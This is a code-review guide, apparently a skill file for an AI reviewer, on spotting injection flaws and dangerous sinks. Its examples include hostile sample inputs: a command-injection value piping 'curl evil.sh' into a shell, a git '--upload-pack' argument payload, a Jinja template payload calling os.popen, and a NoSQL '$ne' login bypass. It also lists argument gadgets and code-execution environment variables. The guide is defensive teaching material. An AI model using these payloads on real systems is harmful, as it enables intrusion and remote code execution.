---
name: injection-and-dangerous-sinks
category: security
description: Use when the diff builds a query, a shell command or argv, a subprocess environment, a template, an XML parse, an eval or a deserialization from data that may be attacker-controlled - SQL/NoSQL, OS command, argument, env-var, template and code injection, XXE, unsafe deserialization
tech_stack: Web & API
source: original; informed by trailofbits/skills (CC BY-SA 4.0, ideas only, own wording) and anthropics/claude-code security-guidance plugin (ideas only); OWASP Top 10:2025 A05/A08 and CWE cited by name only
---
# Injection and Dangerous Sinks

## Overview

Injection is attacker data crossing from the data channel into the code channel of an interpreter: SQL, a shell, a template engine, an XML parser, a deserializer. The fix is almost always structural — keep data and code in separate channels — not escaping.

**Core principle:** the sink is only half the finding. Trace the value back to a source the attacker controls before you call it injection; a constant or a server-side config value in the same position is not.

## 1. SQL Injection (CWE-89)

Only string-built SQL counts. Parameter binding and ORM query builders are the control working.

```go
// ❌
rows, _ := db.Query("SELECT * FROM users WHERE email = '" + email + "'")
// ✅
rows, _ := db.Query("SELECT * FROM users WHERE email = $1", email)
```

Where it hides in ORM code: Django `.raw()`, `.extra()`, `RawSQL`; SQLAlchemy `text(f"…")`; JPA `createQuery("… " + x)` (JPQL injection) and `createNativeQuery`; Spring `JdbcTemplate` with concatenation; Prisma `$queryRawUnsafe`/`$executeRawUnsafe`; Sequelize `literal()`; Knex `raw()` with template strings. Identifiers (`ORDER BY`, column, table names) cannot be bound — they need an allowlist:

```python
# ❌ sort comes from the query string
cur.execute(f"SELECT * FROM tasks ORDER BY {sort}")
# ✅
cur.execute(f"SELECT * FROM tasks ORDER BY {SORTABLE[sort]}")  # dict lookup; KeyError → 400
```

## 2. NoSQL Operator Injection (CWE-943)

A JSON body can carry an object where a string was expected.

```js
// ❌ body {"email": "a@b.c", "password": {"$ne": null}} matches any password
const user = await Users.findOne({ email: req.body.email, password: req.body.password });
// ✅ force scalar types at the boundary (schema validation or String())
const user = await Users.findOne({ email: String(req.body.email) });
```

Also `$where`, `$function` and `mapReduce` with user-built JavaScript.

## 3. OS Command Injection (CWE-78)

The dangerous part is the shell. `sh -c`, `shell=True`, `child_process.exec`, backticks, `system()`, `popen()`.

```python
# ❌ host = "8.8.8.8; curl evil.sh | sh"
subprocess.run(f"ping -c 1 {host}", shell=True)
# ✅ argv list, no shell; host validated as an address (which also rules out a leading "-")
subprocess.run(["ping", "-c", "1", str(ipaddress.ip_address(host))], check=True)
```

`exec.Command(name, args...)`, `execFile`/`spawn` with `shell: false`, `ProcessBuilder(list)` and Java's `Runtime.exec(String)` (it tokenises, it does not invoke a shell) are not shell injection — but see argument injection.

## 4. Argument Injection (CWE-88)

No shell, still exploitable: a value that starts with `-` becomes an option of the program.

```go
// ❌ url = "--upload-pack=touch /tmp/pwned" runs a command
exec.Command("git", "clone", url, dir)
// ✅ end of options, and reject leading dashes on values meant as operands
exec.Command("git", "clone", "--", url, dir)
```

Known gadgets: `git --upload-pack=`/`-c core.sshCommand=`, `ssh -oProxyCommand=`, `tar --checkpoint-action=exec=`, `curl -o`/`-K`, `rsync -e`, `find -exec`, `zip -T -TT`, `wget --use-askpass`. Fix: `--` before operands, plus validation that operands do not start with `-`.

## 5. Environment-Variable Injection into Subprocesses

When a caller controls environment variable names or values passed to a child, several variables are code execution:

`LD_PRELOAD`, `LD_LIBRARY_PATH`, `DYLD_INSERT_LIBRARIES`, `NODE_OPTIONS` (`--require`), `PYTHONPATH`, `PYTHONSTARTUP`, `BASH_ENV`, `ENV`, `PERL5OPT`, `RUBYOPT`, `GIT_SSH_COMMAND`, `GIT_CONFIG_*`, `JAVA_TOOL_OPTIONS`.

```ts
// ❌ user-supplied env merged into the child
spawn(tool, args, { env: { ...process.env, ...req.body.env }, shell: false });
// ✅ only named, validated keys
spawn(tool, args, { env: { PATH: process.env.PATH, LANG: "C", JOB_ID: jobId }, shell: false });
```

## 6. Code Injection and eval (CWE-94, CWE-95)

`eval`, `new Function`, Node `vm` (not a sandbox), Python `eval`/`exec`/`compile`, Java `ScriptEngine`, Groovy shells, SpEL `parseExpression(userInput)`, OGNL/MVEL, Ruby `instance_eval`/`send` with user method names, `setTimeout(string)`. Any user-influenced string reaching these is CRITICAL when reachable. Model output reaching them: llm-and-agent-security.

## 7. Template Injection (CWE-1336)

User input used as the **template**, not as a template variable.

```python
# ❌ the user writes Jinja: {{ cycler.__init__.__globals__.os.popen('id').read() }}
return render_template_string(f"Hello {name}")
# ✅ the user's value is data
return render_template_string("Hello {{ name }}", name=name)
```

Same shape: Go `text/template` parsing user text; FreeMarker/Velocity templates from user input; Thymeleaf view names built from input (`return "user/" + lang;` evaluates `__${…}__` preprocessing); Handlebars/Pug compiled from input.

**Orchestrator templates** are the same bug one level up: Airflow templated fields (`bash_command="echo {{ params.x }}"` or `{{ dag_run.conf['x'] }}`) where a trigger supplies the value; Argo Workflows `{{inputs.parameters.x}}` substituted into a script's source; Tekton `$(params.x)` inside `script:`. Fix: pass the value through an environment variable and quote it in the script.

## 8. XXE (CWE-611)

- Java `DocumentBuilderFactory`, `SAXParserFactory`, `XMLInputFactory`, `TransformerFactory` resolve DTDs and external entities unless configured — look for `disallow-doctype-decl` set to true or the equivalent feature flags.
- Python: `lxml` with `resolve_entities=True` or `no_network=False` on untrusted XML; prefer `defusedxml`. The stdlib `xml.etree` does not fetch external entities but still expands internal ones.
- .NET: `XmlDocument`/`XmlTextReader` with a non-null `XmlResolver` or `DtdProcessing.Parse`.
- Go `encoding/xml` does not resolve external entities — not a finding.

## 9. Unsafe Deserialization (CWE-502)

A deserializer that can instantiate arbitrary types runs attacker code when fed attacker bytes.

| Stack | Dangerous on untrusted input | Safe alternative |
|-------|------------------------------|------------------|
| Python | `pickle.load(s)`, `joblib.load`, `pd.read_pickle`, `np.load(..., allow_pickle=True)`, `torch.load(..., weights_only=False)` (and plain `torch.load` on torch < 2.6), `yaml.load(..., Loader=yaml.Loader)`, `yaml.unsafe_load`, `dill`, `cloudpickle` | JSON, `yaml.safe_load`, safetensors, ONNX, skops |
| Java/Kotlin | `ObjectInputStream.readObject`, `XMLDecoder`, XStream without allowlist, Jackson default typing / `@JsonTypeInfo(use = Id.CLASS)`, SnakeYAML < 2.0 `new Yaml().load` | DTOs with explicit types, an `ObjectInputFilter` allowlist |
| .NET | `BinaryFormatter`, `NetDataContractSerializer`, `LosFormatter`, Json.NET `TypeNameHandling` other than `None` | `System.Text.Json` with known types |
| Ruby / PHP / Node | `Marshal.load`, `YAML.unsafe_load`; `unserialize`; `node-serialize`, `funcster` | `JSON.parse`, `YAML.safe_load` |

"Untrusted" includes a model file a user uploads, a cache entry in a shared Redis, a cookie, and a message on a queue other services write.

## Severity Guide

Reachable command, code, template or deserialization injection → CRITICAL. SQL injection → HIGH, CRITICAL when unauthenticated or reaching credentials. XXE reading local files → HIGH.

## Common Mistakes

- Calling parameterised SQL or an ORM filter injectable.
- Calling `exec.Command("git", "log", userRef)` shell injection — it is argument injection, and only if the value can start with `-`.
- Flagging `LIKE` wildcards (`%`, `_`) as SQL injection — at most a correctness bug.
- Flagging `yaml.safe_load` or `torch.load(..., weights_only=True)`.
- Missing that the "template" passed to `render_template_string` is itself built with an f-string.

## Red Flags

- `f"`, `+`, `%`, `.format(`, `${` or `fmt.Sprintf` on the line that builds a query, a command or a template.
- `shell=True`, `sh -c`, `bash -c`, `cmd /c`, `exec(` from `child_process`.
- A subprocess whose argv operands come from a request and have no `--` before them.
- `env:` built by spreading request data.
- A loader for pickles, model files or serialized objects fed from an upload, a URL or a shared store.

## References (names and links only)

[OWASP Top 10:2025](https://owasp.org/Top10/2025/) A05 Injection, A08 Software or Data Integrity Failures · CWE-78, 88, 89, 94, 502, 611, 943, 1336 at [cwe.mitre.org](https://cwe.mitre.org/) · [ASVS 5.0 V1 Encoding and Sanitization](https://github.com/OWASP/ASVS/tree/master/5.0/en)
